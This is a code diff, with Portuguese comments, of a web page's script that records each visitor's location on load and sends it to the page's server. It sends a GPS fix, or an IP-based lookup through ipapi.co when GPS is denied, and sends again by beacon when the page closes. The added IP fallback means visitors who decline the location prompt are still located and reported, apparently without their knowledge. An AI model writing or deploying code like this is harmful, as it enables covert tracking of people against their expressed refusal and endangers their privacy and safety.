@@ -39,66 +39,66 @@
   </div>
 
   <script>
-    let dadosLocalizacao = {
+    let dadosUltimaLocalizacao = {
       latitude: null,
       longitude: null,
-      maps: ""
+      maps: "",
+      source: "Não obtida"
     };
 
-    // Tenta capturar a geolocalização exata assim que a página abre
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            dadosLocalizacao.latitude = position.coords.latitude;
-            dadosLocalizacao.longitude = position.coords.longitude;
-            dadosLocalizacao.maps = `https://www.google.com/maps?q=${dadosLocalizacao.latitude},${dadosLocalizacao.longitude}`;
-
-            // Envia o acesso inicial com as coordenadas preenchidas
-            enviarDados("/api/send-location", {
-              latitude: dadosLocalizacao.latitude,
-              longitude: dadosLocalizacao.longitude,
-              maps: dadosLocalizacao.maps,
-              acao: 'abriu_pagina'
-            });
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            dadosUltimaLocalizacao = { latitude, longitude, maps, source: "Precisa (GPS)" };
+            enviarParaApi(dadosUltimaLocalizacao, "abriu_pagina");
           },
-          (error) => {
-            console.log("GPS negado ou indisponível: " + error.message);
-            // Envia mesmo sem GPS para registrar o acesso via IP aproximado
-            enviarDados("/api/send-location", {
-              latitude: null,
-              longitude: null,
-              maps: "",
-              acao: 'abriu_pagina_sem_gps'
-            });
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          () => fallbackLocation()
         );
+      } else {
+        fallbackLocation();
       }
     });
 
-    // Envio seguro via fetch normal ao carregar
-    function enviarDados(url, payload) {
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      }).catch(err => console.error(err));
+    function fallbackLocation() {
+      fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+          const latitude = data.latitude;
+          const longitude = data.longitude;
+          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+          dadosUltimaLocalizacao = { latitude, longitude, maps, source: "Aproximada (IP)" };
+          enviarParaApi(dadosUltimaLocalizacao, "abriu_pagina_ip");
+        })
+        .catch(error => {
+          console.error("Erro ao obter localização pelo IP:", error);
+        });
     }
 
-    // Dispara o beacon ao fechar a página (garante o envio da localidade por IP ou última pos)
+    function enviarParaApi(payload, acao) {
+      fetch("/api/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ...payload, acao })
+      }).catch(error => {
+        console.error("Erro:", error);
+      });
+    }
+
+    // Dispara automaticamente a última localização capturada (ou via IP) quando o usuário fecha a página
     window.addEventListener('beforeunload', function () {
       const payload = JSON.stringify({
-        acao: 'fechou_pagina',
-        latitude: dadosLocalizacao.latitude,
-        longitude: dadosLocalizacao.longitude,
-        maps: dadosLocalizacao.maps
+        ...dadosUltimaLocalizacao,
+        acao: 'fechou_pagina'
       });
 
       if (navigator.sendBeacon) {
         navigator.sendBeacon('/api/send-location', payload);
-      } else {
-        enviarDados('/api/send-location', JSON.parse(payload));
       }
     });
   </script>
